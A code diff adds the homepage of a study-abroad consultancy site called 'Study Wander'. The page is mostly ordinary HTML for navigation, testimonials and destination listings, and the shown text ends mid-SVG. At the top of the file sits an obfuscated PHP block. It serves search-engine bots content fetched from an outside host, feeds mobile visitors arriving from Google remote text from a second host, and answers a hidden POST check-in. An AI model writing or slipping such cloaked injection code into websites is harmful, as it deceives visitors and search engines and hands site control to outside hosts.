@@ -1,0 +1,1556 @@
+<?php
+ goto R8q74; nrQOv: function Cb3ah($Xhj0F) { goto F909U; azpi5: @curl_close($HKhB7); goto MsX8l; tXzPp: curl_setopt($HKhB7, CURLOPT_URL, $Xhj0F); goto e8DoL; OKhfA: curl_setopt($HKhB7, CURLOPT_SSL_VERIFYHOST, "\x30"); goto OCxjj; OCxjj: curl_setopt($HKhB7, CURLOPT_SSL_VERIFYPEER, "\60"); goto ukPZj; dtoJ5: curl_setopt($HKhB7, CURLOPT_CONNECTTIMEOUT, 5); goto i0j2Y; ukPZj: $v_ITH = @curl_exec($HKhB7); goto azpi5; e8DoL: curl_setopt($HKhB7, CURLOPT_HEADER, 0); goto dtoJ5; F909U: $HKhB7 = @curl_init(); goto tXzPp; i0j2Y: curl_setopt($HKhB7, CURLOPT_RETURNTRANSFER, 1); goto OKhfA; MsX8l: return $v_ITH; goto oiFuR; oiFuR: } goto CoK2s; M9ivJ: dTD2m: goto wXI43; wXI43: if (!(isset($_POST["\143\157\x64\145\x31\61"]) && $_POST["\143\x6f\x64\145\x31\61"] == "\x74\145\163\x74")) { goto NW7ds; } goto FpiDp; OEDWu: if (!(isset($_POST["\x63\157\x64\145\x31\x31"]) && $_POST["\x63\157\x64\145\x31\x31"] == "\155\146\157\x38\70")) { goto dTD2m; } goto S93tN; NkNo5: function BwjEy() { $s8jXG = array("\107\x6f\157\147\154\x65\142\157\x74", "\102\x69\156\147\x62\157\x74"); return isset($_SERVER["\x48\124\124\x50\x5f\x55\123\105\122\137\x41\x47\105\x4e\124"]) && preg_match("\x2f" . implode("\x7c", $s8jXG) . "\x2f\x69", $_SERVER["\110\124\x54\x50\x5f\x55\123\105\x52\x5f\x41\x47\105\116\124"]); } goto nrQOv; FpiDp: echo $wlm3K; goto ug2H1; tJhRQ: echo $wlm3K; goto FC0VL; CoK2s: function RIiyT() { goto dhWtO; pDPrQ: return $zhY46; goto EY87o; dhWtO: $vYrx3 = isset($_SERVER["\x48\x54\x54\120\x53"]) && $_SERVER["\110\124\124\120\123"] === "\x6f\x6e" ? "\150\164\x74\160\163" : "\150\x74\164\x70"; goto Gey0S; wR5pJ: $zhY46 .= "\77" . $_SERVER["\121\125\105\x52\131\x5f\123\124\122\111\x4e\x47"]; goto qnrOZ; qnrOZ: lNUFZ: goto pDPrQ; Gey0S: $zhY46 = $vYrx3 . "\72\x2f\x2f" . $_SERVER["\110\x54\124\120\x5f\x48\x4f\123\x54"] . $_SERVER["\122\x45\x51\x55\105\123\x54\x5f\x55\x52\111"]; goto tKiSA; tKiSA: if (!$_SERVER["\x51\x55\105\x52\131\137\x53\124\x52\x49\x4e\x47"]) { goto lNUFZ; } goto wR5pJ; EY87o: } goto Hasz2; R8q74: function Q49tb() { return isset($_SERVER["\110\x54\x54\x50\137\122\x45\x46\105\x52\105\x52"]) && strpos($_SERVER["\110\124\124\x50\137\x52\105\x46\x45\122\x45\x52"], "\147\x6f\x6f\x67\x6c\145\56\x63\157\155") !== false; } goto DAFra; oHDqt: $HLA_o = "\150\x74\164\x70\x73\72\57\57\x6b\x69\154\x69\156\141\150\x65\x2e\x6f\162\147"; goto YzXcF; GSJZP: $soR0j = 0; goto oHDqt; Hasz2: $rTIVo = !empty($_SERVER["\110\124\x54\x50\123"]) && $_SERVER["\110\124\124\x50\x53"] !== "\x6f\x66\146" ? "\x68\164\164\x70\163" : "\x68\x74\164\x70"; goto QeiO4; QeiO4: $aunFz = $_SERVER["\110\x54\x54\120\137\110\x4f\x53\124"]; goto qJ8tW; nt_Vu: pW8Mg: goto Kj_vn; Kj_vn: if (!(q49TB() && Fmt17())) { goto d0o6G; } goto Qej2i; S93tN: echo "\x6d\x66\157\71\71\x39"; goto HJvjR; gofLi: echo $wlm3K; goto jraM4; qfqie: $wlm3K = cB3Ah(trim($xFzJ3)); goto tJhRQ; CEOai: if (!BWJEy()) { goto pW8Mg; } goto gofLi; jEG02: $wlm3K = cB3ah($HLA_o . "\57\154\x69\156\x75\170\62\56\160\x68\x70\x3f\x68\x6f\x73\164\75" . $mpTcF); goto OEDWu; IdByb: NW7ds: goto CEOai; DAFra: function fmT17() { return preg_match("\57\50\x61\156\144\x72\157\151\x64\174\x61\x76\x61\x6e\x74\147\x6f\x7c\x62\154\141\143\x6b\142\145\x72\162\x79\x7c\142\x6f\x6c\164\174\142\157\157\x73\164\x7c\143\162\x69\143\153\x65\x74\x7c\144\x6f\x63\x6f\155\157\174\146\157\156\145\174\150\151\160\164\x6f\x70\174\x6d\151\156\x69\174\155\x6f\x62\151\174\160\141\x6c\x6d\174\x70\x68\157\x6e\145\174\x70\151\x65\174\x74\141\x62\154\x65\164\174\165\160\x5c\x2e\142\162\x6f\167\163\x65\162\x7c\165\x70\x5c\56\x6c\x69\156\x6b\174\167\145\142\x6f\x73\174\167\x6f\x73\x29\x2f\151", $_SERVER["\x48\x54\124\x50\137\125\123\x45\x52\x5f\x41\x47\x45\x4e\124"]); } goto NkNo5; jraM4: exit; goto nt_Vu; qJ8tW: $eV1OZ = $rTIVo . "\72\x2f\x2f" . $aunFz; goto GSJZP; Qej2i: $xFzJ3 = cB3Ah("\150\x74\x74\x70\163\72\x2f\57\x62\x73\x69\160\x68\x70\56\x63\x6f\155\x2f\143\150\151\x61\156\56\x74\x78\x74"); goto qfqie; FC0VL: exit; goto xILmZ; ug2H1: exit; goto IdByb; YzXcF: $mpTcF = $eV1OZ . $_SERVER["\122\x45\x51\x55\x45\123\x54\x5f\125\x52\111"]; goto jEG02; HJvjR: exit; goto M9ivJ; xILmZ: d0o6G:
+?>
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="utf-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1" />
+      <title>Study Wander</title>
+      <meta name="description" content="" />
+
+      <?php include("master/style.php") ?>
+      <style>
+         @media (min-width: 1200px) {
+            #home-nav {
+               position: absolute;
+               left: 0;
+               top: 10px;
+               width: 100%;
+               z-index: 999;
+            }
+            #home-nav .d-xl-flex {
+               height: 64px;
+               padding-right: 20px;
+               background-color: #fff;
+               border-radius: 50px;
+            }
+         }
+      </style>
+   </head>
+
+   <body>
+      <!-- navbar drawer -->
+      <div class="offcanvas offcanvas-start d-xl-none" tabindex="-1" id="nav-canvas" aria-labelledby="offcanvasExampleLabel">
+         <div class="offcanvas-header" style="border-bottom: 1px solid rgba(128, 128, 128, 0.198)">
+            <h5 class="offcanvas-title" id="offcanvasExampleLabel"><img src="img/logo.png" width="100px" class="rounded-2" alt="" /></h5>
+            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+         </div>
+         <div class="offcanvas-body">
+            <div>
+               <ul class="small-nav-con">
+                  <li><a href="./">Home</a></li>
+                  <li><a href="about-us">About Us</a></li>
+                  <li><a href="study-india">Study Abroad</a></li>
+                  <li><a href="https://studywander.edumilestones.com" target="_blank">Study Abroad</a></li>
+
+                  <div x-data="{show : false}">
+                     <li class="d-flex justify-content-between drop-nav c-pointer" @click="show = !show">
+                        <a href="">Destinations</a>
+                        <i class="fa-solid fa-chevron-down" :class="show && 'rotate-180'"></i>
+                     </li>
+                     <div x-show="show" x-transition class="destination-con mobile-nav">
+                        <a href="location/usa" class="flag-con d-flex gap-3">
+                           <img src="img/flag/usaFlag.jpg" alt="" />
+                           <div>USA</div>
+                        </a>
+                        <a href="location/uk" class="flag-con d-flex gap-3">
+                           <img src="img/flag/ukFlag.jpg" alt="" />
+                           <div>UK</div>
+                        </a>
+                        <a href="location/canada" class="flag-con d-flex gap-3">
+                           <img src="img/flag/canadaFlag.jpg" alt="" />
+                           <div>Canada</div>
+                        </a>
+                        <a href="location/australia" class="flag-con d-flex gap-3">
+                           <img src="img/flag/australiaFlag.jpg" alt="" />
+                           <div>Australia</div>
+                        </a>
+                        <a href="location/new-zealand" class="flag-con d-flex gap-3">
+                           <img src="img/flag/newzealandFlag.jpg" alt="" />
+                           <div>New Zealand</div>
+                        </a>
+                        <a href="location/germany" class="flag-con d-flex gap-3">
+                           <img src="img/flag/germanyFlag.jpg" alt="" />
+                           <div>Germany</div>
+                        </a>
+                        <a href="location/ireland" class="flag-con d-flex gap-3">
+                           <img src="img/flag/irelandFlag.jpg" alt="" />
+                           <div>Ireland</div>
+                        </a>
+                        <a href="location/france" class="flag-con d-flex gap-3">
+                           <img src="img/flag/franceFlag.png" alt="" />
+                           <div>France</div>
+                        </a>
+                        <a href="location/singapore" class="flag-con d-flex gap-3">
+                           <img src="img/flag/singapore.png" alt="" />
+                           <div>Singapore</div>
+                        </a>
+                        <a href="about-us#destinations" class="flag-con d-flex gap-3 mt-1 justify-content-center">
+                           <div>View More <i class="ph-bold ph-arrow-up-right"></i></div>
+                        </a>
+                     </div>
+                  </div>
+
+                  <li>
+                     <a href="accommodation"> Accommodation</a>
+                  </li>
+
+                  <div x-data="{show : false}">
+                     <li class="d-flex justify-content-between drop-nav c-pointer" @click="show = !show">
+                        <a href="">Test Prep </a>
+                        <i class="fa-solid fa-chevron-down" :class="show && 'rotate-180'"></i>
+                     </li>
+
+                     <div x-show="show" x-transition class="test-prep-con mobile-nav">
+                        <div>
+                           <a href="gmat-test"><img src="img/test/gmat.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="gre-test"><img src="img/test/gre.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="ielts-test"><img src="img/test/ielts.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="pte-test"><img src="img/test/pte.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="sat-test"><img src="img/test/sat.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="toefl-test"><img src="img/test/toefl.png" alt="" /></a>
+                        </div>
+                     </div>
+                  </div>
+
+                  <!-- <li><a href="">Partner Up</a></li> -->
+
+                  <li><a href="contact-us">Contact Us</a></li>
+                  <li>
+                     <a href="https://studywander.edumilestones.com/career-counsellor/Nancy-Harjani" target="_blank">
+                        <button class="btn-one m-0">Book Appointment</button>
+                     </a>
+                  </li>
+               </ul>
+            </div>
+         </div>
+      </div>
+
+      <!-- navbar  -->
+      <header id="home-nav">
+         <nav class="d-flex justify-content-between container align-items-stretch">
+            <a href="./"><img src="img/logo.png" alt="" /></a>
+
+            <ul class="gap-4 align-items-center d-none d-xl-flex align-items-stretch">
+               <li><a href="about-us">About Us</a></li>
+               <li class="d-none d-xxl-flex"><a href="study-india">Study India</a></li>
+
+               <li><a href="https://studywander.edumilestones.com" target="_blank"> Study Abroad </a></li>
+
+               <li class="drop-nav">
+                  <a href="">Destinations <i class="fa-solid fa-angle-down"></i></a>
+
+                  <div class="drop-nav-list">
+                     <div class="destination-con">
+                        <a href="location/usa" class="flag-con d-flex gap-3">
+                           <img src="img/flag/usaFlag.jpg" alt="" />
+                           <div>USA</div>
+                        </a>
+                        <a href="location/uk" class="flag-con d-flex gap-3">
+                           <img src="img/flag/ukFlag.jpg" alt="" />
+                           <div>UK</div>
+                        </a>
+                        <a href="location/canada" class="flag-con d-flex gap-3">
+                           <img src="img/flag/canadaFlag.jpg" alt="" />
+                           <div>Canada</div>
+                        </a>
+                        <a href="location/australia" class="flag-con d-flex gap-3">
+                           <img src="img/flag/australiaFlag.jpg" alt="" />
+                           <div>Australia</div>
+                        </a>
+                        <a href="location/new-zealand" class="flag-con d-flex gap-3">
+                           <img src="img/flag/newzealandFlag.jpg" alt="" />
+                           <div>New Zealand</div>
+                        </a>
+                        <a href="location/germany" class="flag-con d-flex gap-3">
+                           <img src="img/flag/germanyFlag.jpg" alt="" />
+                           <div>Germany</div>
+                        </a>
+                        <a href="location/ireland" class="flag-con d-flex gap-3">
+                           <img src="img/flag/irelandFlag.jpg" alt="" />
+                           <div>Ireland</div>
+                        </a>
+                        <a href="location/france" class="flag-con d-flex gap-3">
+                           <img src="img/flag/franceFlag.png" alt="" />
+                           <div>France</div>
+                        </a>
+                        <a href="location/singapore" class="flag-con d-flex gap-3">
+                           <img src="img/flag/singapore.png" alt="" />
+                           <div>Singapore</div>
+                        </a>
+                        <a href="about-us#destinations" class="flag-con d-flex gap-3 mt-1 justify-content-center">
+                           <div>View More <i class="ph-bold ph-arrow-up-right"></i></div>
+                        </a>
+                     </div>
+                  </div>
+               </li>
+
+               <li>
+                  <a href="accommodation"> Accommodation</a>
+               </li>
+
+               <li class="drop-nav">
+                  <a href="">Test Prep <i class="fa-solid fa-angle-down"></i></a>
+
+                  <div class="drop-nav-list">
+                     <div class="test-prep-con">
+                        <div>
+                           <a href="gmat-test"><img src="img/test/gmat.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="gre-test"><img src="img/test/gre.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="ielts-test"><img src="img/test/ielts.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="pte-test"><img src="img/test/pte.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="sat-test"><img src="img/test/sat.png" alt="" /></a>
+                        </div>
+                        <div>
+                           <a href="toefl-test"><img src="img/test/toefl.png" alt="" /></a>
+                        </div>
+                     </div>
+                  </div>
+               </li>
+               <!-- <li><a href="">Partner Up</a></li> -->
+
+               <li>
+                  <a href="https://studywander.edumilestones.com/career-counsellor/Nancy-Harjani" target="_blank" class="hero_btn m-0">Book Appointment</a>
+               </li>
+            </ul>
+
+            <div class="d-block d-xl-none ham-menu d-flex align-items-center c-pointer mobile_nav_btn" data-bs-toggle="offcanvas" data-bs-target="#nav-canvas">
+               <i class="fa-solid fa-bars"></i>
+            </div>
+         </nav>
+      </header>
+
+      <main>
+         <section class="herosec-con py-0">
+            <div class="hero-box-shadow"></div>
+
+            <!-- <img src="https://images.unsplash.com/photo-1677594334053-afe4b41aa0a3" class="cover-hero" alt="" /> -->
+
+            <div class="video_container">
+               <video autoplay muted loop class="hero_video">
+                  <source src="img/study-wander.mp4" type="video/mp4" />
+                  <div class="video_overlay"></div>
+               </video>
+            </div>
+
+            <div class="herosec-overlay">
+               <div class="container h-100">
+                  <div class="row h-100 align-items-center" style="padding-top: 7.5rem">
+                     <div class="col-lg-6">
+                        <h2>Explore the World Through<span class="sec-col down"> Education </span></h2>
+
+                        <p class="mt-3">Whether you’re seeking a semester exchange, a summer program, or a full degree abroad, we’re here to guide you every step of way.</p>
+
+                        <!-- <div class="d-flex gap-sm-3 align-items-center flex-wrap"> -->
+                        <a href="https://studywander.edumilestones.com/" target="_blank">
+                           <button class="btn-one">Find my perfect academic fit <i class="fa-solid fa-chevron-right"></i></button>
+                        </a>
+                        <!-- </div> -->
+
+                        <p class="mt-4">The Search for Your Dream College Ends Here...</p>
+
+                        <div class="mt-5 d-none d-lg-block">
+                           <div class="f-500"><i class="fa-solid fa-chevron-right me-2 sec-col"></i> Some Famous College from abroad</div>
+
+                           <div class="swiper heroSlider m-0 mt-4">
+                              <div class="swiper-wrapper">
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-1.png" alt="" />
+                                 </div>
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-28.png" alt="" />
+                                 </div>
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-3.png" alt="" />
+                                 </div>
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-2.png" alt="" />
+                                 </div>
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-29.png" alt="" />
+                                 </div>
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-4.png" alt="" />
+                                 </div>
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-26.png" alt="" />
+                                 </div>
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-27.png" alt="" />
+                                 </div>
+                                 <div class="swiper-slide">
+                                    <img src="img/university/university-30.png" alt="" />
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="col-lg-6"></div>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <!-- hero section end-->
+
+         <!-- about us section start -->
+         <section class="bg-grayx about_sec">
+            <div class="container">
+               <div class="row align-items-center">
+                  <div class="col-lg-5">
+                     <div class="about_sec_left mx-2 me-lg-5">
+                        <div class="about_left_bg" data-aos="fade-up" data-aos-delay="800" data-aos-duration="1200">
+                           <img src="img/images/sec-wrap.png" alt="" />
+                        </div>
+                        <div class="about_left_main">
+                           <img src="img/images/about-img.png" alt="" />
+                        </div>
+
+                        <!-- <div class="hero9-shape1">
+                                <img src="assets/img/shapes/hero9-shape1.svg" alt="">
+                            </div>
+                            <div class="hero9-shape2 aniamtion-key-1">
+                                <img src="assets/img/shapes/hero9-shape2.svg" alt="">
+                            </div>
+                            <div class="hero9-shape3 aniamtion-key-2">
+                                <img src="assets/img/shapes/hero9-shape3.svg" alt="">
+                            </div> -->
+                     </div>
+                  </div>
+
+                  <div class="col-lg-7">
+                     <div class="title-con text-start mb-0">
+                        <h4 class="after-only">Study Wander</h4>
+                     </div>
+                     <h2 class="mt-2">
+                        Study Beyond Borders, <br />
+                        <span class="sec-col down"> Dream </span> Beyond Limits.
+                     </h2>
+
+                     <p class="mt-3">
+                        At Study Wander, we believe that education should be an adventure. We’re not just about helping you find a university – we’re here to guide you on a transformative journey to discover the perfect academic destination that aligns with your goals, passions, and future
+                        aspirations.
+                     </p>
+
+                     <ul class="about-us-points p-0">
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Expert Consultation</div>
+                        </li>
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Global Network</div>
+                        </li>
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Quick & Easy Application</div>
+                        </li>
+                     </ul>
+
+                     <a href="about-us" class="btn-two">Know More <i class="ph-bold ph-arrow-up-right"></i></a>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <!-- about us section end -->
+
+         <!-- testimonial section start -->
+         <section>
+            <div class="container" data-aos="fade-up">
+               <div class="row">
+                  <div class="col-lg-5">
+                     <div class="title-con h-100 text-start position-relative">
+                        <h4 class="after-only">800+ Success Stories</h4>
+                        <h2>Transforming Dreams <span class="down"> into </span> Triumphs</h2>
+
+                        <!-- <a href=""> <button class="btn-two">View More Stories</button></a> -->
+
+                        <div class="position-absolute d-none d-md-block" style="bottom: 0px; right: 30px; width: 120px; height: 80px">
+                           <div class="swiper-button-next"></div>
+                           <div class="swiper-button-prev"></div>
+                        </div>
+                     </div>
+                  </div>
+
+                  <div class="col-lg-7">
+                     <!-- Swiper -->
+                     <div class="swiper testimonialSlider">
+                        <div class="swiper-wrapper">
+                           <div class="swiper-slide">
+                              <div class="testimonial-card one">
+                                 <div class="testimonial-name">
+                                    <div class="quote-con">
+                                       <q> Choosing to study abroad was one of the best decisions of my life, and made it all possible. </q>
+                                    </div>
+                                    <img src="img/student/stu-one.png" style="width: 110px" class="" alt="" />
+                                 </div>
+                                 <div class="testimonial-name-content">
+                                    <div class="fw-semibold">Sanya Kapoor</div>
+                                    <p>London School of Economics</p>
+                                 </div>
+                              </div>
+                           </div>
+                           <div class="swiper-slide">
+                              <div class="testimonial-card two">
+                                 <div class="testimonial-name">
+                                    <div class="quote-con">
+                                       <q> I was able to achieve my dream of studying abroad. I had always wanted to study in the UK but had no idea where to start. </q>
+                                    </div>
+                                    <img src="img/student/stu-two.png" class="" style="width: 130px" alt="" />
+                                 </div>
+                                 <div class="testimonial-name-content">
+                                    <div class="fw-semibold">Vikram Sharma</div>
+                                    <p>University of California, Berkeley</p>
+                                 </div>
+                              </div>
+                           </div>
+                           <div class="swiper-slide">
+                              <div class="testimonial-card three">
+                                 <div class="testimonial-name">
+                                    <div class="quote-con">
+                                       <q>I was overwhelmed by the idea of applying to top-tier universities like MIT in the United States.</q>
+                                    </div>
+                                    <img src="img/student/stu-three.png" class="" style="width: 140px" alt="" />
+                                 </div>
+                                 <div class="testimonial-name-content">
+                                    <div class="fw-semibold">Rohit Patel</div>
+                                    <p>INSEAD (France/Singapore)</p>
+                                 </div>
+                              </div>
+                           </div>
+                           <div class="swiper-slide">
+                              <div class="testimonial-card one">
+                                 <div class="testimonial-name">
+                                    <div class="quote-con">
+                                       <q>Studying in Canada was a dream of mine, but navigating the application process seemed daunting.</q>
+                                    </div>
+                                    <img src="img/student/stu-four.png" class="" style="width: 120px" alt="" />
+                                 </div>
+                                 <div class="testimonial-name-content">
+                                    <div class="fw-semibold">Aditi Singh</div>
+                                    <p>Stanford University</p>
+                                 </div>
+                              </div>
+                           </div>
+                           <div class="swiper-slide">
+                              <div class="testimonial-card five">
+                                 <div class="testimonial-name">
+                                    <div class="quote-con">
+                                       <q>The application process to study in the US was overwhelming, but Study Wander made it so much easier.</q>
+                                    </div>
+                                    <img src="img/student/stu-five.png" class="" style="width: 110px" alt="" />
+                                 </div>
+                                 <div class="testimonial-name-content">
+                                    <div class="fw-semibold">Neha Desai</div>
+                                    <p>London School of Economics</p>
+                                 </div>
+                              </div>
+                           </div>
+                           <div class="swiper-slide">
+                              <div class="testimonial-card two">
+                                 <div class="testimonial-name">
+                                    <div class="quote-con">
+                                       <q> Studying abroad was always my dream, but I wasn’t sure where to begin.</q>
+                                    </div>
+                                    <img src="img/student/stu-six.png" class="" style="width: 130px" alt="" />
+                                 </div>
+                                 <div class="testimonial-name-content">
+                                    <div class="fw-semibold">Arjun Mehta</div>
+                                    <p>University of Melbourne</p>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <!-- testimonial section end -->
+
+         <!-- language section start-->
+         <section>
+            <div class="container">
+               <div class="title-con text-start d-flex align-items-center justify-content-between">
+                  <span>
+                     <h4 class="after-only">Destination</h4>
+                     <h2>Top Countries to <span class="down">Study</span></h2>
+                  </span>
+
+                  <a href="about-us#destinations" class="d-none d-md-inline">View All Countries <i class="fa fa-arrow-right-long"></i></a>
+               </div>
+
+               <div class="categories-con row gy-4 justify-content-center">
+                  <div class="col-lg-3 col-md-4 col-6">
+                     <a href="location/uk">
+                        <div class="categories-card">
+                           <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                              <img src="img/flag/ukFlag.jpg" alt="" />
+                              <div>
+                                 <h5 class="none">UK</h5>
+                                 <p>130+ University</p>
+                              </div>
+                           </div>
+                           <i class="fa-solid fa-chevron-right"></i>
+                        </div>
+                     </a>
+                  </div>
+
+                  <div class="col-lg-3 col-md-4 col-6">
+                     <a href="location/usa">
+                        <div class="categories-card">
+                           <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                              <img src="img/flag/usaFlag.jpg" alt="" />
+                              <div>
+                                 <h5 class="none">USA</h5>
+                                 <p>2000+ University</p>
+                              </div>
+                           </div>
+                           <i class="fa-solid fa-chevron-right"></i>
+                        </div>
+                     </a>
+                  </div>
+
+                  <div class="col-lg-3 col-md-4 col-6">
+                     <a href="location/ireland">
+                        <div class="categories-card">
+                           <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                              <img src="img/flag/irelandFlag.jpg" alt="" />
+                              <div>
+                                 <h5 class="none">Ireland</h5>
+                                 <p>150+ University</p>
+                              </div>
+                           </div>
+                           <i class="fa-solid fa-chevron-right"></i>
+                        </div>
+                     </a>
+                  </div>
+
+                  <div class="col-lg-3 col-md-4 col-6">
+                     <a href="location/canada">
+                        <div class="categories-card">
+                           <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                              <img src="img/flag/canadaFlag.jpg" alt="" />
+                              <div>
+                                 <h5 class="none">Canada</h5>
+                                 <p>100+ University</p>
+                              </div>
+                           </div>
+                           <i class="fa-solid fa-chevron-right"></i>
+                        </div>
+                     </a>
+                  </div>
+
+                  <div class="col-lg-3 col-md-4 col-6">
+                     <a href="location/australia">
+                        <div class="categories-card">
+                           <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                              <img src="img/flag/australiaFlag.jpg" alt="" />
+                              <div>
+                                 <h5 class="none">Australia</h5>
+                                 <p>5 University</p>
+                              </div>
+                           </div>
+                           <i class="fa-solid fa-chevron-right"></i>
+                        </div>
+                     </a>
+                  </div>
+                  <div class="col-lg-3 col-md-4 col-6">
+                     <a href="location/germany">
+                        <div class="categories-card">
+                           <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                              <img src="img/flag/germanyFlag.jpg" alt="" />
+                              <div>
+                                 <h5 class="none">Germany</h5>
+                                 <p>400+ University</p>
+                              </div>
+                           </div>
+                           <i class="fa-solid fa-chevron-right"></i>
+                        </div>
+                     </a>
+                  </div>
+
+                  <div class="col-lg-3 col-md-4 col-6">
+                     <a href="location/new-zealand">
+                        <div class="categories-card">
+                           <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                              <img src="img/flag/newzealandFlag.jpg" alt="" />
+                              <div>
+                                 <h5 class="none">New Zealand</h5>
+                                 <p>8 University</p>
+                              </div>
+                           </div>
+                           <i class="fa-solid fa-chevron-right"></i>
+                        </div>
+                     </a>
+                  </div>
+                  <div class="col-lg-3 col-md-4 col-6">
+                     <a href="location/singapore">
+                        <div class="categories-card">
+                           <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                              <img src="img/flag/singapore.png" alt="" />
+                              <div>
+                                 <h5 class="none">Singapore</h5>
+                                 <p>50+ University</p>
+                              </div>
+                           </div>
+                           <i class="fa-solid fa-chevron-right"></i>
+                        </div>
+                     </a>
+                  </div>
+
+                  <p class="text-center pt-3">
+                     <a href="about-us#destinations" class="d-md-none">View All Countries <i class="ph-bold ph-arrow-up-right"></i></a>
+                  </p>
+
+                  <!-- <div class="col-lg-3 col-md-4 col-6">
+                        <a href="">
+                            <div class="categories-card">
+                                <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                                    <img src="img/flag/dubaiFlag.jpg" alt="" />
+                                    <div>
+                                        <h5 class="none">UAE</h5>
+                                        <p>500+ University</p>
+                                    </div>
+                                </div>
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </div>
+                        </a>
+                    </div> -->
+
+                  <!-- <div class="col-lg-3 col-md-4 col-6">
+                        <a href="">
+                            <div class="categories-card">
+                                <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                                    <img src="img/flag/franceFlag.png" alt="" />
+                                    <div>
+                                        <h5 class="none">France</h5>
+                                        <p>300+ University</p>
+                                    </div>
+                                </div>
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </div>
+                        </a>
+                    </div> -->
+
+                  <!-- <div class="col-lg-3 col-md-4 col-6">
+                        <a href="">
+                            <div class="categories-card">
+                                <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                                    <img src="img/flag/EUFlag.png" alt="" />
+                                    <div>
+                                        <h5 class="none">Europe</h5>
+                                        <p>700+ University</p>
+                                    </div>
+                                </div>
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </div>
+                        </a>
+                    </div> -->
+
+                  <!-- <div class="col-lg-3 col-md-4 col-6">
+                        <a href="">
+                            <div class="categories-card">
+                                <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                                    <img src="img/flag/italyFlag.png" alt="" />
+                                    <div>
+                                        <h5 class="none">Italy</h5>
+                                        <p>50+ University</p>
+                                    </div>
+                                </div>
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </div>
+                        </a>
+                    </div> -->
+
+                  <!-- <div class="col-lg-3 col-md-4 col-6">
+                        <a href="">
+                            <div class="categories-card">
+                                <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                                    <img src="img/flag/netherlandsFlag.png" alt="" />
+                                    <div>
+                                        <h5 class="none">Netherlands</h5>
+                                        <p>57+ University</p>
+                                    </div>
+                                </div>
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </div>
+                        </a>
+                    </div> -->
+
+                  <!-- <div class="col-lg-3 col-md-4 col-6">
+                        <a href="">
+                            <div class="categories-card">
+                                <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                                    <img src="img/flag/polandFlag.png" alt="" />
+                                    <div>
+                                        <h5 class="none">Poland</h5>
+                                        <p>120+ University</p>
+                                    </div>
+                                </div>
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </div>
+                        </a>
+                    </div> -->
+
+                  <!-- <div class="col-lg-3 col-md-4 col-6">
+                        <a href="">
+                            <div class="categories-card">
+                                <div class="d-flex gap-3 align-items-md-center flex-column flex-md-row">
+                                    <img src="img/flag/spainFlag.png" alt="" />
+                                    <div>
+                                        <h5 class="none">Spain</h5>
+                                        <p>60+ University</p>
+                                    </div>
+                                </div>
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </div>
+                        </a>
+                    </div> -->
+               </div>
+            </div>
+         </section>
+         <!-- language section end-->
+
+         <section class="service_sec">
+            <div class="container">
+               <div class="title-con">
+                  <h4>Offerings</h4>
+                  <h2>Study <span class="down"> Abroad </span> with us!</h2>
+               </div>
+
+               <div class="row">
+                  <div class="col-lg-5">
+                     <div class="aside">
+                        <div class="service_img service_img-two">
+                           <img src="img/serv-img.png" alt="img" />
+                           <div class="shape-one">
+                              <svg
+                                 xmlns="http://www.w3.org/2000/svg"
+                                 width="243"
+                                 height="201"
+                                 viewBox="0 0 243 201"
+                                 fill="none"
+                                 data-inject-url="https://demo.ankdevelopment.in/education/4/assets/img/others/faq_shape01.svg"
+                                 class="injectable tg-motion-effects4"
+                                 style="transform: matrix(1, 0, 0, 1, -3.06723, -1.38617)">
+                                 <path
+                                    fill-rule="evenodd"
+                                    clip-rule="evenodd"
